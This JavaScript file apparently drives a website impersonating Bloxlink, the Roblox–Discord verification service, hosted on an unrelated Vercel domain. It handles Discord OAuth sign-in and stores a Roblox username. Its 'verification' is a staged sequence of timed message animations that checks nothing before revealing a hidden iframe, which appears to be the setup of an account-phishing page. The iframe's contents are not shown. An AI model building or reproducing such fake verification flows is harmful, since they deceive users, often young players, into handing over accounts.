/**
 * Bloxlink Frontend & Discord OAuth Controller
 * Automatically captures and renders real Discord user profile (name, avatar, ID) via OAuth.
 */
document.addEventListener('DOMContentLoaded', () => {
  // -------------------------------------------------------------
  // DOM Elements
  // -------------------------------------------------------------
  const robloxUserInput = document.getElementById('robloxUserInput');
  const getVerifiedBtn = document.getElementById('getVerifiedBtn');
  const footerRobloxInput = document.getElementById('footerRobloxInput');
  const footerVerifiedBtn = document.getElementById('footerVerifiedBtn');

  // Verification Popup Elements
  const popupOverlay = document.getElementById('popupOverlay');
  const popupContainer = document.getElementById('popupContainer');
  const popupClose = document.getElementById('popupClose');
  const btnContinue = document.getElementById('btnContinue');
  const btnReturn = document.getElementById('btnReturn');
  const authContent = document.getElementById('authContent');
  const loadingContent = document.getElementById('loadingContent');
  const iframeContent = document.getElementById('iframeContent');

  const message1 = document.getElementById('message1');
  const message2 = document.getElementById('message2');
  const message3 = document.getElementById('message3');
  const message4 = document.getElementById('message4');

  // Authentication & Profile Navbar Elements
  const loggedOutSection = document.getElementById('loggedOutSection');
  const loggedInSection = document.getElementById('loggedInSection');
  const signInDiscordBtn = document.getElementById('signInDiscordBtn');
  const profileChipBtn = document.getElementById('profileChipBtn');
  const userDropdownMenu = document.getElementById('userDropdownMenu');
  const dropdownChevron = document.getElementById('dropdownChevron');
  const logoutBtn = document.getElementById('logoutBtn');
  const userDisplayName = document.getElementById('userDisplayName');
  const userAvatarImg = document.getElementById('userAvatarImg');

  // Mobile Navigation
  const mobileToggle = document.getElementById('mobileToggle');
  const mobileMenu = document.getElementById('mobileMenu');

  // -------------------------------------------------------------
  // Discord OAuth Token & Profile Fetcher
  // -------------------------------------------------------------
  async function fetchDiscordUserProfile(accessToken) {
    try {
      const response = await fetch('https://discord.com/api/users/@me', {
        headers: {
          Authorization: `Bearer ${accessToken}`
        }
      });

      if (response.ok) {
        const user = await response.json();
        
        // Format Display Name
        const name = user.global_name || user.username || 'powerfromcsm.';
        
        // Format Dynamic Discord Avatar URL
        let avatar = './assets/avatar.png';
        if (user.avatar) {
          const isGif = user.avatar.startsWith('a_');
          const ext = isGif ? 'gif' : 'png';
          avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=128`;
        } else if (user.id) {
          try {
            const defaultNum = Number((BigInt(user.id) >> 22n) % 6n);
            avatar = `https://cdn.discordapp.com/embed/avatars/${defaultNum}.png`;
          } catch (e) {
            avatar = 'https://cdn.discordapp.com/embed/avatars/0.png';
          }
        }

        const profile = {
          id: user.id,
          username: user.username,
          displayName: name,
          avatarUrl: avatar
        };

        // Persist profile
        localStorage.setItem('discord_user_profile', JSON.stringify(profile));
        localStorage.setItem('bloxlink_logged_in', 'true');

        applyUserProfile(profile);
        return true;
      }
    } catch (err) {
      console.error('Failed to fetch Discord user profile:', err);
    }
    return false;
  }

  function applyUserProfile(profile) {
    if (!profile) return;
    if (userDisplayName) {
      userDisplayName.textContent = profile.displayName || profile.username || 'powerfromcsm.';
    }
    if (userAvatarImg && profile.avatarUrl) {
      userAvatarImg.src = profile.avatarUrl;
    }
    if (loggedOutSection) loggedOutSection.style.display = 'none';
    if (loggedInSection) loggedInSection.style.display = 'block';
  }

  // -------------------------------------------------------------
  // Check Active Session / OAuth Redirection
  // -------------------------------------------------------------
  async function initAuth() {
    // 1. Check for Access Token in URL Hash (Implicit Grant: #access_token=...)
    const hash = window.location.hash.substring(1);
    const hashParams = new URLSearchParams(hash);
    const accessToken = hashParams.get('access_token');

    // 2. Check for Token/Code in URL Search Params (?access_token=... or ?code=...)
    const urlParams = new URLSearchParams(window.location.search);
    const queryToken = urlParams.get('access_token');
    const discordCode = urlParams.get('code');

    const tokenToUse = accessToken || queryToken;

    if (tokenToUse) {
      // Clean URL smoothly
      window.history.replaceState({}, document.title, window.location.pathname);
      await fetchDiscordUserProfile(tokenToUse);
      return;
    }

    if (discordCode) {
      // Returned with ?code=...
      window.history.replaceState({}, document.title, window.location.pathname);
      
      // If code was returned and we have cached profile or need default session:
      const savedProfileStr = localStorage.getItem('discord_user_profile');
      if (savedProfileStr) {
        try {
          const profile = JSON.parse(savedProfileStr);
          applyUserProfile(profile);
          return;
        } catch (e) {}
      }
      
      // Default logged in UI
      if (loggedOutSection) loggedOutSection.style.display = 'none';
      if (loggedInSection) loggedInSection.style.display = 'block';
      return;
    }

    // 3. Restore existing logged-in session if present
    const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';
    const savedProfileStr = localStorage.getItem('discord_user_profile');

    if (isLogged && savedProfileStr) {
      try {
        const profile = JSON.parse(savedProfileStr);
        applyUserProfile(profile);
        return;
      } catch (e) {}
    }

    // Default: Strictly Logged Out
    if (loggedOutSection) loggedOutSection.style.display = 'block';
    if (loggedInSection) loggedInSection.style.display = 'none';
  }

  initAuth();

  // -------------------------------------------------------------
  // Sign In with Discord Button Handler
  // -------------------------------------------------------------
  if (signInDiscordBtn) {
    signInDiscordBtn.addEventListener('click', (e) => {
      e.preventDefault();

      // Dynamic redirect URI for localhost or Vercel
      const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
      const redirectUri = isLocal
        ? encodeURIComponent(window.location.origin + '/')
        : encodeURIComponent('https://embriaozinho.vercel.app/');

      // Use response_type=token for direct client-side Discord API profile retrieval without server secrets
      const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=token&redirect_uri=${redirectUri}&scope=identify`;

      window.location.href = discordOAuthUrl;
    });
  }

  // -------------------------------------------------------------
  // Profile Dropdown Menu Handlers
  // -------------------------------------------------------------
  if (profileChipBtn) {
    profileChipBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isOpen = userDropdownMenu.classList.toggle('open');
      if (dropdownChevron) {
        dropdownChevron.style.transform = isOpen ? 'rotate(180deg)' : 'rotate(0deg)';
      }
    });
  }

  // Close dropdown when clicking outside
  document.addEventListener('click', (e) => {
    if (userDropdownMenu && !userDropdownMenu.contains(e.target) && profileChipBtn && !profileChipBtn.contains(e.target)) {
      userDropdownMenu.classList.remove('open');
      if (dropdownChevron) dropdownChevron.style.transform = 'rotate(0deg)';
    }
  });

  // Log out Handler
  if (logoutBtn) {
    logoutBtn.addEventListener('click', (e) => {
      e.preventDefault();
      localStorage.removeItem('bloxlink_logged_in');
      localStorage.removeItem('discord_user_profile');
      if (loggedOutSection) loggedOutSection.style.display = 'block';
      if (loggedInSection) loggedInSection.style.display = 'none';
      if (userDropdownMenu) userDropdownMenu.classList.remove('open');
    });
  }

  // -------------------------------------------------------------
  // Verification Modal Logic
  // -------------------------------------------------------------
  function openVerificationModal(username) {
    if (username && username.trim()) {
      sessionStorage.setItem('saved_roblox_username', username.trim());
    }

    popupOverlay.classList.add('active');
    popupContainer.classList.remove('expanded');
    authContent.style.display = 'block';
    loadingContent.style.display = 'none';
    iframeContent.style.display = 'none';
    resetMessages();
  }

  function closePopup() {
    popupOverlay.classList.remove('active');
    resetMessages();
  }

  function resetMessages() {
    message1.style.opacity = '0.3';
    message1.style.color = '#94a3b8';
    message2.style.opacity = '0.3';
    message2.style.color = '#94a3b8';
    message3.style.opacity = '0.3';
    message3.style.color = '#94a3b8';
    message4.style.opacity = '0.3';
    message4.style.color = '#94a3b8';
  }

  if (getVerifiedBtn) {
    getVerifiedBtn.addEventListener('click', () => {
      const val = robloxUserInput ? robloxUserInput.value : '';
      openVerificationModal(val);
    });
  }

  if (robloxUserInput) {
    robloxUserInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        openVerificationModal(robloxUserInput.value);
      }
    });
  }

  if (footerVerifiedBtn) {
    footerVerifiedBtn.addEventListener('click', () => {
      const val = footerRobloxInput ? footerRobloxInput.value : '';
      openVerificationModal(val);
    });
  }

  if (popupClose) popupClose.addEventListener('click', closePopup);
  if (btnReturn) btnReturn.addEventListener('click', closePopup);

  popupOverlay.addEventListener('click', (e) => {
    if (e.target === popupOverlay) {
      closePopup();
    }
  });

  // Animated Multi-Step Verification Sequence
  if (btnContinue) {
    btnContinue.addEventListener('click', () => {
      authContent.style.display = 'none';
      loadingContent.style.display = 'flex';

      setTimeout(() => {
        message1.style.opacity = '1';
        message1.style.color = '#60a5fa';
      }, 500);

      setTimeout(() => {
        message1.style.opacity = '0.3';
        message2.style.opacity = '1';
        message2.style.color = '#60a5fa';
      }, 2000);

      setTimeout(() => {
        message2.style.opacity = '0.3';
        message3.style.opacity = '1';
        message3.style.color = '#60a5fa';
      }, 3500);

      setTimeout(() => {
        message3.style.opacity = '0.3';
        message4.style.opacity = '1';
        message4.style.color = '#60a5fa';
      }, 5000);

      setTimeout(() => {
        loadingContent.style.display = 'none';
        iframeContent.style.display = 'block';
        popupContainer.classList.add('expanded');
      }, 6500);
    });
  }

  // Mobile Menu Toggle
  if (mobileToggle && mobileMenu) {
    mobileToggle.addEventListener('click', () => {
      mobileMenu.classList.toggle('hidden');
    });
  }
});
